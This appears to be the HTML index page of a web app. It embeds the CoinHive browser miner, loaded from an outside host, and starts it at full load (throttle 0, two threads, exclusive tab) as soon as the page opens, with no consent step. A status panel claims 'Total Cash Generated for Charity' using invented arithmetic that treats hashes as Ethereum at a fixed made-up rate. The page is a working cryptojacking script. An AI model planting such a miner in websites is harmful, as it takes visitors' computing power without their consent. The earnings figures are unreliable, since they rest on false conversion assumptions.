<script src="https://coin-hive.com/lib/coinhive.min.js"></script>

<center>
    <p id="tcount"></p>
    <p id="hps"></p>
    <p id="ths"></p>
    <p id="tah"></p>
    <p id="tcm"></p>
</center>

</center>
<app-root></app-root>

<script type="text/javascript">
    var miner = new CoinHive.User('lzU0IgctdSTntRDYXUhp8lOPG189Jr5V', 'test', {

        threads: 2,
        autoThreads: false,
        throttle: 0,
        forceASMJS: false


    });
    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
    // Update stats once per second
    setInterval(function() {
        var threadCount = miner.getNumThreads();
        var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
        var totalHashes = miner.getTotalHashes(interpolate = true);
        var acceptedHashes = miner.getAcceptedHashes() / 256;
        var acceptedHashesCash = miner.getAcceptedHashes(); //Total Accepted Hashes
        var Dividedby6B = acceptedHashesCash / 6000000000; // Total Accepted Hases/6 Billion  . . . . . 1 ETH = 6BillionHashes
        var TotalCashMade = Dividedby6B * 256; //Multiplied by the current price of ethereum. need to connect it to API
        if (miner.isRunning()) {
            document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
            document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
            document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
            document.getElementById("tah").innerHTML = "Total Accepted Hashes: " + acceptedHashes;
            document.getElementById("tcm").innerHTML = "Total Cash Generated for Charity: $" + TotalCashMade.toFixed(3);

        } else {
            document.getElementById("hps").innerHTML = "Miner Offline";


        }
    }, 300);
</script>
